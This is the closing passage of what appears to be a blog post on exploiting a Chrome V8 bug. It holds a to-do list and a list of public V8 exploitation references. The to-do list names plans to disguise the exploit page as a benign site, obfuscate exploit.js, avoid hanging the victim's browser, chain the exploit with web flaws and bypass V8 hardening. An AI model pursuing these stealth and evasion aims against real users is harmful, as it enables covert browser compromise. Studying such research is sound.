  <li>Remove the target's browser from hanging upon exploitation.</li>
  <li>Make <code>index.html</code> more realistic, i.e. a benign looking website of some form.</li>
  <li>Demonstrate how this exploit could be chained with other vulnerabilities, i.e. web application vulnerabilities.</li>
  <li>Obfuscate the contents of <code>exploit.js</code>.</li>
  <li>Determine another method of exploitability other than WebAssembly/RWX, as there may be hardening capabilities here which would render this technique useless. For example, in recent Chrome and V8 engine versions; WASM code regions are marked as <code>W^X</code> (with <code>pkey_mprotect</code>, so the classic WASM trick is redundant. Further, Heapcage has also been introduced and it removes a lot of external 64 bit pointers (but not all) from the v8 heap. However, there has been some demonstration of functional bypasses for these. I need to research this more.</li>
</li>
</ul>
<p><h2><font color="white">[ REFERENCES ]</font></h2></p>
  <ul>
    <li><a href="http://phrack.org/issues/70/3.html#article">http://phrack.org/issues/70/3.html#article</a></li>
    <li><a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</a></li>
    <li><a href="https://faraz.faith/2021-01-07-cve-2020-16040-analysis/">https://faraz.faith/2021-01-07-cve-2020-16040-analysis/</a></li>
    <li><a href="https://github.com/singularseclab/Browser_Exploits/tree/master/CVE-2020-1604%5B0%7C1%5D">https://github.com/singularseclab/Browser_Exploits/tree/master/CVE-2020-1604%5B0%7C1%5D</a></li>
    <li><a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/">https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/</a></li>
    <li><a href="https://doar-e.github.io/blog/2019/05/09/circumventing-chromes-hardening-of-typer-bugs/">https://doar-e.github.io/blog/2019/05/09/circumventing-chromes-hardening-of-typer-bugs/</a></li>
    <li><a href="https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/htmlpresent">https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/htmlpresent</a></li>
    <li><a href="https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-1">https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-1</a></li>
    <li><a href="https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-2">https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-2</a></li>
    <li><a href="https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-3">https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-3</a></li>
    <li><a href="https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-4/">https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-4/</a></li>
    <li><a href="https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-5">https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-5</a></li>
    <li><a href="https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-6">https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-6</a></li>
    <li><a href="https://v8.dev">https://v8.dev</a></li>
    <li><a href="https://docplayer.net/154570612-Jeremy-fetiveau-attacking-turbofan.html">https://docplayer.net/154570612-Jeremy-fetiveau-attacking-turbofan.html</a></li>
    <li><a href="https://iamelli0t.github.io/2021/04/20/Chromium-Issue-1196683-1195777.html">https://iamelli0t.github.io/2021/04/20/Chromium-Issue-1196683-1195777.html</a></li>
    <li><a href="https://medium.com/dailyjs/understanding-v8s-bytecode-317d46c94775">https://medium.com/dailyjs/understanding-v8s-bytecode-317d46c94775</a></li>
    <li><a href="https://sensepost.com/blog/2020/intro-to-chromes-v8-from-an-exploit-development-angle/">https://sensepost.com/blog/2020/intro-to-chromes-v8-from-an-exploit-development-angle/</a></li>
    <li><a href="https://darksi.de/d.sea-of-nodes/">https://darksi.de/d.sea-of-nodes/</a></li>
    <li><a href="https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8">https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8</a></li>
    <li><a href="https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/">https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/</a></li>
    <li><a href="https://v8docs.nodesource.com/node-0.12/index.html">https://v8docs.nodesource.com/node-0.12/index.html</a></li>
    <li><a href="https://github.com/v8/v8/blob/2781d585038b97ed375f2ec06651dc9e5e04f916/src">https://github.com/v8/v8/blob/2781d585038b97ed375f2ec06651dc9e5e04f916/src</a></li>
    <li><a href="https://github.com/v8/v8/blob/ba1b2cc09ab98b51ca3828d29d19ae3b0a7c3a92/src">https://github.com/v8/v8/blob/ba1b2cc09ab98b51ca3828d29d19ae3b0a7c3a92/src</a></li>
    <li><a href="https://github.com/singularseclab/Slides/blob/main/2021/chrome_exploitation-zer0con2021.pdf">https://github.com/singularseclab/Slides/blob/main/2021/chrome_exploitation-zer0con2021.pdf</a></li>
</ul>
<p></p>
<center><footer><< <a href="https://github.com/ret2eax">github</a> : <a href=mailto:homecrew@riseup.net>homecrew@riseup.net</a> : <a href="https://keys.openpgp.org/search?q=D3E19869F7AF832F">pgp</a> >></footer></center>
<p>
<!-- Cloudflare Web Analytics --><script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "de308c7bac84443286fa4c969da28bb7"}'></script><!-- End Cloudflare Web Analytics -->
</body>
</html>
